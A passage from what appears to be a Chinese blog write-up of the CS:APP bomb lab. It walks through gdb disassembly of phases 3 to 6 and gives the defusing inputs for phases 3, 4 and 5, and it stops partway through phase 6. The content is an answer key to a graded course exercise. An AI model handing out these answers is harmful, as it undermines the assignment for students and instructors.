0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax</span><br><span class="line">   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8)</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:   retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>JA是无符号大于时跳转；jmpq d(a,b,c)=jmp a+b*c+d</p>
</blockquote>
<p>这段代码一上来调用了sscanf函数，老规矩 print (char<em>)0x4025cf，发现格式字符串为“%d %d”，也就是两个int数字，同时<code>cmp    $0x1,%eax</code>要求return值大于1，接下来39行读取第一个数字，要求小于等于7，否则也会引爆炸弹，再往下+50，发现跳转语句，根据第一个数字取值的不同跳转到不同的地址`</em>0x402470(,%rax,8)` 后，获取一个值放入%eax里，要求第二个数必须等于放入的值。</p>
<p>由此我们顺序运行下去发现跳转到了<code>=&gt; 0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax</code>这里，于是“rax            0x137    311”就是我们的最终答案，即 1 311 这个关键词可以过phase3这关。</p>
<h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 2, 0x000000000040100c in phase_4 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">=&gt; 0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:    test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>现在我们来看看phase4，首先<code>print (char*)0x4025cf</code>可以发现 0x4025cf “%d %d”，说明本次还是两个int的输入。34行的 cmpl   $0xe,0x8(%rsp) 要求第一个数字必须 &lt;= 14, &gt;= 0（无符号）然后到46行开始输入参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info register</span><br><span class="line">......</span><br><span class="line">rdx            0xe      14</span><br><span class="line">rsi            0x0      0</span><br><span class="line">rdi            0x1      1</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>查看调用func4时的寄存器可以清楚看到，第一个参数是1即我们输入的第一个数字，第二个参数为0，第三个参数为14，那我们接下来进入func4函数中一看究竟：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 3, 0x0000000000400fce in func4 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function func4:</span><br><span class="line">=&gt; 0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:    sar    %eax</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>经过摸索，这段汇编代码大概是一个如下的二分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val = (j + i) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val &gt;= n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">2</span> * func4(n, val+<span class="number">1</span>, j) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(n, i, val<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>TEST    测试(两操作数作与运算,仅修改标志位,不回送结果) 由此 test ax,ax 即是判断 ax == 0？</p>
</blockquote>
<p>然后<code>test   %eax,%eax</code>判断return是否为0，如果非0就爆炸。同时<code>cmpl   $0x0,0xc(%rsp)</code>要求第二个输入为0，由此最简单的输入就是 0 0，这样就可以过关</p>
<h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">=&gt; 0x0000000000401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:   retq</span><br><span class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>首先通过<code>cmp    $0x6,%eax</code>我们可以确定字符串长度为6，然后跳转 <code>movzbl (%rbx,%rax,1),%ecx</code> 执行 mobzbl 指令（将一个源操作数低1字节长度的值0扩展到32位并存放在目标寄存器处），在这里就是取得字符串内第一个字符；而后将此字符（就是 %cl 内存放的 值，%cl 是 %ecx 的低8位寄存器）送到栈顶%rsp处。<code>and    $0xf,%edx</code>获取当前字符的后四位 ，<code>movzbl 0x4024b0(%rdx),%edx</code>将edx后四位作为0x4024b0字符数组的索引值，依次拷贝字符数组到0x10((%rsp,%rax,1))，再用%rax循环6次。<code>movb   $0x0,0x16(%rsp)</code>字符串末尾添加”\0”后和字符串常量$0x40245e进行比较。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char*)0x4024b0</span><br><span class="line">$2 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br><span class="line">(gdb) print (char*)0x40245e</span><br><span class="line">$3 = 0x40245e &quot;flyers&quot;</span><br></pre></td></tr></table></figure>
<p>所以用来被截取的字符串为“maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?”，用来对比的字符串为“flyers”，我们发现flyers6个字符分别出现在str1的第9位，第15位，第14位，第5位，第6位，第7位，输入的字符串后四位的二进制只要分别表示9,15,14,5,6,7即可，翻查ASCII表，可以得到结果 ionefg （YONUFG）</p>
<h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">=&gt; 0x00000000004010f4 &lt;+0&gt;:     push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:     push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:     push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:     push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:     push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:   pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:   pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:   pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:   pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:   retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>终于到最后一个了，<del>这最后一个看起来有点劝退啊orz</del>~，首先依然是<code>callq  0x40145c &lt;read_six_numbers&gt;</code>读取六个数字。然后将栈顶指针赋给%eax，也就是要求 <code>第一个数字 - 1 &lt;= 5</code> ，然后用%r12d作循环计数，到62行开始执行判断六个数字不相等的功能，然后跳到81行开始执行判断数字小于等于6的功能。到后面110行将数字与7求差并将结果放入原先位置。</p>
<p>然后抽象的来了，我们来细看这段汇编代码：</p>
